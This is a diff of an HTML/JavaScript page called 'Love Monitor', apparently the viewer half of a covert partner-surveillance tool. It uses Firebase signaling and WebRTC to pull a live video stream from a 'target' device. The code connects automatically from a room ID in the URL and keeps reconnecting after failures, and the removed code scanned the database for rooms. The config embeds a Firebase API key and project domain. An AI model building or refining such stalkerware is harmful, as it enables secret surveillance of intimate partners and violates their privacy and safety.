@@ -1,61 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🕵️‍♂️ Love Monitor</title>
+    <title>🔍 Love Monitor</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 20px;
-            background: black;
-            color: lime;
+            background: #0a0a0a;
+            color: #0f0;
             font-family: monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .title { color: #f0f; font-size: 2.5em; text-shadow: 0 0 10px #f0f; }
+        #videoContainer {
+            background: #000;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            border: 3px solid #f0f;
+            position: relative;
         }
         #remoteVideo {
             width: 100%;
-            max-width: 600px;
-            border: 3px solid red;
+            display: block;
+        }
+        .status-overlay {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .control-panel {
+            background: #111;
+            padding: 20px;
+            border-radius: 10px;
             margin: 20px 0;
+            border: 1px solid #333;
         }
-        #roomInput {
-            padding: 10px;
-            width: 300px;
-            margin: 10px;
+        .room-info {
+            background: #222;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 4px solid #f0f;
         }
-        #connectBtn {
-            background: red;
-            color: white;
+        button {
+            background: linear-gradient(45deg, #f0f, #0ff);
+            color: black;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 25px;
+            border-radius: 25px;
             cursor: pointer;
+            font-weight: bold;
+            margin: 10px 5px;
+            font-size: 16px;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         .log {
             background: #111;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 12px;
+            padding: 15px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+            border: 1px solid #333;
+        }
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+            font-size: 0.9em;
         }
     </style>
 </head>
 <body>
-    <h1>🔴 LIVE SPY SYSTEM</h1>
-    
-    <div>
-        <input type="text" id="roomInput" placeholder="Room ID dari target">
-        <button id="connectBtn" onclick="connectToTarget()">🎯 CONNECT</button>
+    <div class="container">
+        <div class="header">
+            <h1 class="title">💘 LOVE MONITOR</h1>
+            <p>Real-time WebRTC Surveillance System</p>
+        </div>
+        
+        <div id="videoContainer">
+            <div class="status-overlay" id="statusOverlay">
+                🔴 MENUNGGU KONEKSI
+            </div>
+            <video id="remoteVideo" autoplay playsinline></video>
+        </div>
+        
+        <div class="control-panel">
+            <div class="room-info" id="roomInfo">
+                <strong>ROOM ID:</strong> <span id="roomIdDisplay">-</span>
+                <br>
+                <strong>STATUS:</strong> <span id="connectionStatus">Disconnected</span>
+            </div>
+            
+            <button onclick="connectToRoom()" id="connectBtn">🔗 CONNECT TO ROOM</button>
+            <button onclick="disconnect()" id="disconnectBtn" disabled>✖️ DISCONNECT</button>
+            <button onclick="copyRoomLink()" id="copyBtn">📋 COPY ROOM LINK</button>
+        </div>
+        
+        <div class="log" id="log"></div>
     </div>
-    
-    <video id="remoteVideo" autoplay playsinline></video>
-    
-    <div id="status">🟡 Waiting for connection...</div>
-    
-    <div class="log" id="log"></div>
 
     <!-- Firebase -->
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
     <script>
-        // =============== FIREBASE ===============
+        // ========== CONFIG ==========
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -67,133 +127,239 @@
         };
         
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const database = firebase.database();
         
-        // =============== WEBRTC VARIABLES ===============
+        // ========== VARIABLES ==========
         let peerConnection;
         let roomId;
+        let answerListener;
+        let candidateListener;
+        let statsInterval;
         
-        // =============== CONNECT TO TARGET ===============
-        async function connectToTarget() {
-            roomId = document.getElementById('roomInput').value.trim();
+        // ========== GET ROOM ID FROM URL ==========
+        function getRoomIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('room') || null;
+        }
+        
+        // ========== ON LOAD ==========
+        window.onload = function() {
+            roomId = getRoomIdFromURL();
+            
+            if (roomId) {
+                document.getElementById('roomIdDisplay').textContent = roomId;
+                document.getElementById('statusOverlay').textContent = `🎯 ROOM DETECTED: ${roomId}`;
+                log(`Auto-detected room: ${roomId}`);
+                
+                // Auto-connect after 1 second
+                setTimeout(() => {
+                    connectToRoom();
+                }, 1000);
+            } else {
+                log("❌ No room ID in URL");
+                log("Example URL: spy_auto.html?room=ABC123");
+            }
+        };
+        
+        // ========== CONNECT TO ROOM ==========
+        async function connectToRoom() {
             if (!roomId) {
-                log("❌ Masukkan Room ID!");
+                log("❌ No room ID available!");
                 return;
             }
             
-            log("🔗 Connecting to room: " + roomId);
+            const connectBtn = document.getElementById('connectBtn');
+            const disconnectBtn = document.getElementById('disconnectBtn');
+            
+            connectBtn.disabled = true;
+            disconnectBtn.disabled = false;
+            
+            log(`🔗 Connecting to room: ${roomId}`);
             
             try {
-                // 1. CHECK IF ROOM EXISTS
-                const snapshot = await db.ref('rooms/' + roomId).once('value');
+                // Check if room exists
+                const snapshot = await database.ref('rooms/' + roomId).once('value');
                 if (!snapshot.exists()) {
-                    log("❌ Room tidak ditemukan!");
-                    return;
+                    throw new Error("Room tidak ditemukan di server!");
                 }
                 
-                // 2. SETUP WEBRTC
-                setupWebRTC();
+                log("✅ Room found! Setting up WebRTC...");
                 
-                // 3. CREATE AND SEND OFFER
-                const offer = await peerConnection.createOffer();
+                // Setup WebRTC
+                await setupWebRTC();
+                
+                // Create and send offer
+                const offer = await peerConnection.createOffer({
+                    offerToReceiveVideo: true,
+                    offerToReceiveAudio: false
+                });
+                
                 await peerConnection.setLocalDescription(offer);
                 
-                // Send offer to target
-                await db.ref('rooms/' + roomId + '/offer').set(offer);
+                // Clean old offer first
+                await database.ref(`rooms/${roomId}/offer`).remove();
                 
-                log("📤 Offer sent to target...");
+                // Send offer
+                await database.ref(`rooms/${roomId}/offer`).set(offer);
+                log("📤 Offer sent to target");
                 
-                // 4. LISTEN FOR ANSWER
-                listenForAnswer();
+                // Setup listeners
+                setupListeners();
                 
-                // 5. LISTEN FOR TARGET'S ICE CANDIDATES
-                listenForTargetCandidates();
+                // Update UI
+                document.getElementById('statusOverlay').textContent = "🟢 CONNECTING...";
+                document.getElementById('connectionStatus').textContent = "Connecting";
                 
-            } catch (err) {
-                log("❌ Error: " + err.message);
+            } catch (error) {
+                log(`❌ Connection failed: ${error.message}`);
+                connectBtn.disabled = false;
+                document.getElementById('statusOverlay').textContent = "🔴 CONNECTION FAILED";
+                
+                // Auto-retry in 3 seconds
+                setTimeout(() => {
+                    if (!peerConnection || peerConnection.connectionState !== 'connected') {
+                        log("🔄 Auto-retrying connection...");
+                        connectToRoom();
+                    }
+                }, 3000);
             }
         }
         
-        // =============== WEBRTC SETUP ===============
+        // ========== WEBRTC SETUP ==========
         function setupWebRTC() {
-            const config = {
+            peerConnection = new RTCPeerConnection({
                 iceServers: [
                     { urls: 'stun:stun.l.google.com:19302' },
                     { urls: 'stun:stun1.l.google.com:19302' }
                 ]
-            };
-            
-            peerConnection = new RTCPeerConnection(config);
+            });
             
             // Handle incoming stream
             peerConnection.ontrack = (event) => {
-                log("🎥 Stream received!");
-                const remoteVideo = document.getElementById('remoteVideo');
-                remoteVideo.srcObject = event.streams[0];
-                document.getElementById('status').textContent = "🟢 LIVE STREAM ACTIVE";
+                log("🎥 Video stream received!");
+                const video = document.getElementById('remoteVideo');
+                video.srcObject = event.streams[0];
+                
+                document.getElementById('statusOverlay').textContent = "🔴 LIVE - CONNECTED";
+                document.getElementById('connectionStatus').textContent = "Connected";
+                log("✅ WebRTC connection established!");
             };
             
-            // ICE Candidate handler
+            // ICE candidate handler
             peerConnection.onicecandidate = (event) => {
                 if (event.candidate) {
-                    db.ref('rooms/' + roomId + '/candidates/spy').push({
-                        candidate: event.candidate
-                    });
+                    database.ref(`rooms/${roomId}/spyCandidates`).push(event.candidate.toJSON());
                 }
             };
             
             // Connection state
             peerConnection.onconnectionstatechange = () => {
-                log("Connection state: " + peerConnection.connectionState);
+                const state = peerConnection.connectionState;
+                log(`Connection state: ${state}`);
+                
+                if (state === 'connected') {
+                    document.getElementById('statusOverlay').textContent = "🔴 LIVE - STREAM ACTIVE";
+                } else if (state === 'disconnected' || state === 'failed' || state === 'closed') {
+                    handleDisconnection();
+                }
             };
         }
         
-        // =============== LISTEN FOR ANSWER ===============
-        function listenForAnswer() {
-            db.ref('rooms/' + roomId + '/answer').on('value', async (snapshot) => {
+        // ========== SETUP LISTENERS ==========
+        function setupListeners() {
+            // Listen for answer
+            answerListener = database.ref(`rooms/${roomId}/answer`).on('value', async (snapshot) => {
                 const answer = snapshot.val();
-                if (answer && peerConnection.signalingState !== 'stable') {
-                    log("📥 Answer received!");
+                if (answer && peerConnection.signalingState === 'have-local-offer') {
+                    log("📥 Answer received from target");
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                 }
             });
-        }
-        
-        // =============== LISTEN FOR TARGET CANDIDATES ===============
-        function listenForTargetCandidates() {
-            db.ref('rooms/' + roomId + '/candidates/target').on('child_added', async (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.candidate) {
+            
+            // Listen for target ICE candidates
+            candidateListener = database.ref(`rooms/${roomId}/targetCandidates`).on('child_added', async (snapshot) => {
+                const candidate = snapshot.val();
+                if (candidate) {
                     try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                         log("✅ ICE candidate added");
                     } catch (e) {
-                        log("❌ ICE error: " + e.message);
+                        log(`⚠️ ICE error: ${e.message}`);
                     }
                 }
             });
         }
         
-        // =============== UTILS ===============
+        // ========== DISCONNECT ==========
+        function disconnect() {
+            cleanup();
+            
+            document.getElementById('connectBtn').disabled = false;
+            document.getElementById('disconnectBtn').disabled = true;
+            document.getElementById('statusOverlay').textContent = "🔴 DISCONNECTED";
+            document.getElementById('connectionStatus').textContent = "Disconnected";
+            
+            log("✖️ Disconnected from room");
+        }
+        
+        // ========== HANDLE DISCONNECTION ==========
+        function handleDisconnection() {
+            log("⚠️ Connection lost!");
+            document.getElementById('statusOverlay').textContent = "🔴 RECONNECTING...";
+            
+            // Auto-reconnect
+            setTimeout(() => {
+                if (roomId && (!peerConnection || peerConnection.connectionState !== 'connected')) {
+                    log("🔄 Auto-reconnecting...");
+                    connectToRoom();
+                }
+            }, 2000);
+        }
+        
+        // ========== COPY ROOM LINK ==========
+        function copyRoomLink() {
+            const link = `${window.location.origin}${window.location.pathname}?room=${roomId}`;
+            navigator.clipboard.writeText(link).then(() => {
+                log("📋 Room link copied to clipboard!");
+            });
+        }
+        
+        // ========== CLEANUP ==========
+        function cleanup() {
+            // Remove listeners
+            if (answerListener) database.ref(`rooms/${roomId}/answer`).off('value', answerListener);
+            if (candidateListener) database.ref(`rooms/${roomId}/targetCandidates`).off('child_added', candidateListener);
+            
+            // Clear intervals
+            if (statsInterval) clearInterval(statsInterval);
+            
+            // Close WebRTC
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            
+            // Clear video
+            const video = document.getElementById('remoteVideo');
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+        }
+        
+        // ========== LOG UTILITY ==========
         function log(message) {
             const logDiv = document.getElementById('log');
             const entry = document.createElement('div');
-            entry.textContent = new Date().toLocaleTimeString() + " - " + message;
+            entry.className = "log-entry";
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
             logDiv.appendChild(entry);
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        // =============== AUTO-DISCOVER ROOMS ===============
-        db.ref('rooms').on('value', (snapshot) => {
-            const rooms = snapshot.val();
-            if (rooms) {
-                const roomList = Object.keys(rooms);
-                if (roomList.length > 0) {
-                    document.getElementById('roomInput').value = roomList[0];
-                    log("🔍 Found room: " + roomList[0]);
-                }
-            }
-        });
+        // Auto-cleanup
+        window.addEventListener('beforeunload', cleanup);
+        window.addEventListener('pagehide', cleanup);
     </script>
 </body>
     </html>
